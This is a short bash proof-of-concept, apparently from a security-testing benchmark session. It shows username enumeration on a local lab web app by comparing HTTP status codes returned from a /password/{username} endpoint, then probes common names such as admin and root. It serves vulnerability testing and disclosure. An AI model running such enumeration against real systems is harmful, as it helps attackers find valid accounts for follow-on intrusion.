#!/bin/bash
# POC: Demonstrates username enumeration via response status code differences on /password/{username} endpoint
# Target: ./repo
# Created: 2025-10-30T19:56:34.334Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

TARGET="http://localhost:8082"
echo "=== Username Enumeration POC ==="
echo "Target: $TARGET/password/{username}"
echo ""

# Test valid username (based on evidence showing 'test' returns 200)
echo "[*] Testing valid username: 'test'"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/password/test")
echo "    Response Code: $RESPONSE"

if [ "$RESPONSE" = "200" ]; then
    echo "    [✓] Username 'test' EXISTS (HTTP 200)"
else
    echo "    [✗] Username 'test' does not exist (HTTP $RESPONSE)"
fi

echo ""

# Test invalid usernames
INVALID_USERS=("invaliduser" "nonexistent" "fakeuser123")

for username in "${INVALID_USERS[@]}"; do
    echo "[*] Testing invalid username: '$username'"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/password/$username")
    echo "    Response Code: $RESPONSE"
    
    if [ "$RESPONSE" = "302" ]; then
        echo "    [✓] Username '$username' does NOT exist (HTTP 302)"
    elif [ "$RESPONSE" = "200" ]; then
        echo "    [!] Username '$username' EXISTS (HTTP 200)"
    else
        echo "    [?] Unexpected response: HTTP $RESPONSE"
    fi
    echo ""
done

echo "=== Summary ==="
echo "Vulnerability: Username enumeration is possible"
echo "Method: Different HTTP status codes (200 for valid, 302 for invalid)"
echo "Impact: Attackers can enumerate valid usernames without authentication"
echo ""
echo "[*] Testing a few common usernames to demonstrate enumeration..."
COMMON_USERS=("admin" "user" "alice" "bob" "root")

FOUND_USERS=()
NOT_FOUND_USERS=()

for username in "${COMMON_USERS[@]}"; do
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/password/$username")
    if [ "$RESPONSE" = "200" ]; then
        FOUND_USERS+=("$username")
        echo "    [FOUND] $username (HTTP 200)"
    else
        NOT_FOUND_USERS+=("$username")
        echo "    [NOT FOUND] $username (HTTP $RESPONSE)"
    fi
done

echo ""
echo "=== Results ==="
echo "Valid usernames found: ${#FOUND_USERS[@]}"
if [ ${#FOUND_USERS[@]} -gt 0 ]; then
    echo "    ${FOUND_USERS[*]}"
fi
echo "Invalid usernames: ${#NOT_FOUND_USERS[@]}"
if [ ${#NOT_FOUND_USERS[@]} -gt 0 ]; then
    echo "    ${NOT_FOUND_USERS[*]}"
fi